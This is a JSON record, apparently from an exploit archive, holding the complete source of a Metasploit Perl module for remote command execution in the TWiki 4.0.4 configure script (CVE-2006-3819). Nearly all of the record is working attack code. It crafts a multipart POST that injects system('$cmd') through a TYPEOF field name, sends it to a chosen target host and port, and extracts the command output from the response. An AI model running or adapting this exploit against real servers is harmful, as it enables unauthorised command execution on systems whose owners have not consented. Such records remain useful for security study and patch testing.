{
  "id": "2110",
  "title": "TWiki 4.0.4 - Configure Script Remote Code Execution (Metasploit)",
  "cve": null,
  "vuln_type": "rce",
  "code": "##\r\n# This file is part of the Metasploit Framework and may be redistributed\r\n# according to the licenses defined in the Authors field below. In the\r\n# case of an unknown or missing license, this file defaults to the same\r\n# license as the core Framework (dual GPLv2 and Artistic). The latest\r\n# version of the Framework can always be obtained from metasploit.com.\r\n##\r\n\r\npackage Msf::Exploit::twiki_config_typeof;\r\nuse base \"Msf::Exploit\";\r\nuse strict;\r\nuse Pex::Text;\r\nuse bytes;\r\n\r\nmy $advanced = { \r\n\t'HttpBoundary' => ['Mtb06z', 'HTTP boundary']\r\n};\r\n\r\nmy $info = {\r\n\t'Name'     => 'Twiki Configure script TYPEOF Parameter Remote Command Execution',\r\n\t'Version'  => '$Revision: 1.0 $',\r\n\t'Authors'  => [ 'David Maciejak <david dot maciejak at gmail dot com>' ],\r\n\t'Arch'     => [ ],\r\n\t'OS'       => [ ],\r\n\t'Priv'     => 1,\r\n\t'UserOpts' =>\r\n\t  {\r\n\t\t'RHOST' => [1, 'ADDR', 'The target address'],\r\n\t\t'RPORT' => [1, 'PORT', 'The target port', 80],\r\n\t\t'VHOST' => [0, 'DATA', 'The virtual host name of the server'],\r\n\t\t'DIR'   => [1, 'DATA', 'Directory of Twiki', '/twiki'],\r\n\t\t'SSL'   => [0, 'BOOL', 'Use SSL'],\r\n\t  },\r\n\r\n\t'Description' => Pex::Text::Freeform(qq{\r\n\t\tThis module exploits an arbitrary command execution vulnerability in the\r\n\tTwiki configure script. All versions of Twiki prior to \r\n\t4.0.4 hotfix 2 are vulnerable. Patch HotFix04x00x04x02 is available on twiki.org homepage.\r\n}),\r\n\t'Refs' =>\r\n\t  [\r\n\t\t['BID', '19188'],\r\n\t\t['CVE', '2006-3819'],\r\n\t\t['OSVDB', '27556'],\r\n\t  ],\r\n\r\n\t'Payload' =>\r\n\t  {\r\n\t\t'Space' => 128,\r\n\t\t'Keys'  => ['cmd','cmd_bash'],\r\n\t  },\r\n\r\n\t'Keys' => ['twiki'],\r\n\r\n\t'DisclosureDate' => 'Jul 27 2006',\r\n  };\r\n\r\nsub new {\r\n\tmy $class = shift;\r\n\tmy $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);\r\n\treturn($self);\r\n}\r\n\r\nsub Exploit {\r\n\tmy $self = shift;\r\n\tmy $target_host    = $self->VHost;\r\n\tmy $target_port    = $self->GetVar('RPORT');\r\n\tmy $dir            = $self->GetVar('DIR');\r\n\tmy $encodedPayload = $self->GetVar('EncodedPayload');\r\n\tmy $cmd            = $encodedPayload->RawPayload;\r\n\tmy $boundary\t\t = $self->GetLocal('HttpBoundary');\t\t\r\n\r\n\t$cmd=\r\n\t\t\"\\r\\n--\".$boundary.\"\\r\\n\".\r\n\t\t\"Content-Disposition: form-data; name=\\\"action\\\"\\r\\n\\r\\n\".\r\n\t\t\"update\\r\\n\".\r\n\t\t\"--\".$boundary.\r\n\t\t\"Content-Disposition: form-data; name=\\\"TYPEOF:{system('$cmd')}\\\"\\r\\n\\r\\n\".\r\n\t\t\"BOOLEAN\\r\\n\".\r\n\t\t\"--\".$boundary;\r\n\r\n\tmy $proto=\"http\";\r\n\tif ($self->GetVar('SSL'))\r\n\t{\r\n\t\t$proto.=\"s\";\r\n\t}\r\n\r\n\t my $request =\r\n    \t\"POST \".$dir.\"/bin/configure HTTP/1.1\\r\\n\".\r\n\t\t\"Content-Type: multipart/form-data; boundary=\".$boundary.\"\\r\\n\".\r\n\t\t\"User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.31-grsec i686)\\r\\n\".\r\n\t\t\"Host: $target_host\\r\\n\".\r\n\t\t\"Referer: \".$proto.\"://\".$target_host.$dir.\"/bin/configure\\r\\n\".\r\n\t\t\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/png\\r\\n\".\r\n\t\t\"Accept-Language: en\\r\\n\".\r\n\t\t\"Content-Length: \". length($cmd). \"\\r\\n\\r\\n\".\r\n\t\t$cmd;\r\n\r\n\tmy $s = Msf::Socket::Tcp->new(\r\n\t\t'PeerAddr' => $target_host,\r\n\t\t'PeerPort' => $target_port,\r\n\t\t'SSL'      => $self->GetVar('SSL'),\r\n\t  );\r\n\r\n\tif ($s->IsError){\r\n\t\t$self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n\t\treturn;\r\n\t}\r\n\r\n\t$s->Send($request);\r\n\r\n\tmy $results = $s->Recv(-1, 200);\r\n\r\n\tif ($results=~ /^transfer-encoding:[ \\t]*chunked\\b/im){\r\n\t\tmy @extract_result;\r\n\t\tmy @results = split ( /\\r\\n/, $results );\r\n\r\n\t\tchomp @results;\r\n\t\tmy $fill_extract_result=0;\r\n\t\tmy $end_break=0;\r\n\t\tmy $i=0;\r\n\t\twhile ( !$end_break && ($i < @results)){\r\n\t\t\tif ($results[$i] =~ /\\<div id=\\\"patternScreen\\\"\\>/)\r\n\t\t\t{\r\n\t\t\t\t$fill_extract_result=0;\r\n\t\t\t\t$end_break=1;\r\n\t\t\t}\r\n\t\t\tif ($fill_extract_result>0) {\r\n\t\t\t\t\tpush(@extract_result,$results[$i]);\r\n\t\t\t}\r\n\t\t\tif ($results[$i] =~ /\\<body class=\\\"patternNoViewPage\\\"\\>/)\r\n\t\t\t{\r\n\t\t\t\t$fill_extract_result=1;\r\n\t\t\t}\r\n\t\t\t$i++;\r\n\t\t}\r\n\r\n\t\tif (@extract_result < 3) {\r\n\t\t\t\t$self->PrintLine(\"[*] Target may be not vulnerable, or you have used ';' char in CMD\");\t\r\n\t\t}\r\n\t\telse {\r\n\t\t\tfor ($i=1;$i<@extract_result;$i+=2) {\r\n\t\t\t\tchomp @extract_result;\r\n\t\t\t\t$self->PrintLine(\"$extract_result[$i]\");\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\t$s->Close();\r\n\treturn;\r\n}\r\n\r\nsub VHost {\r\n\tmy $self = shift;\r\n\tmy $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');\r\n\treturn $name;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2006-08-02]",
  "url": "https://www.exploit-db.com/exploits/2110"
}